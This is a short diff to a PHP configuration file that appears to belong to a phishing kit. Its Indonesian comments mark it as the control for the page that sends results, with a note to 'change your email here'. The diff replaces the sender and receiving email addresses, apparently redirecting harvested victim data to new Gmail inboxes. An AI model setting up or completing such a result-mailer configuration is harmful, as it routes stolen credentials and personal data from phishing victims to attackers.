@@ -1,7 +1,7 @@
 <?php
 // KONTROL UNTUK HALAMAN KIRIM RESULT
 $author = 'GOJO OWNER ';
-$sender = 'From: 彡[GOJO STORE ]彡  🇮🇳 <Gojobot1234@outlook.com>';
+$sender = 'From: 彡[GOJO STORE ]彡  🇮🇳 <krishnapatra7735716@gmail.com>';
 
-$emailku = 'Gojobot1234@outlook.com'; // GANTI EMAIL KAMU DISINI
+$emailku = 'kkds7188@gmail.com'; // GANTI EMAIL KAMU DISINI
 ?>
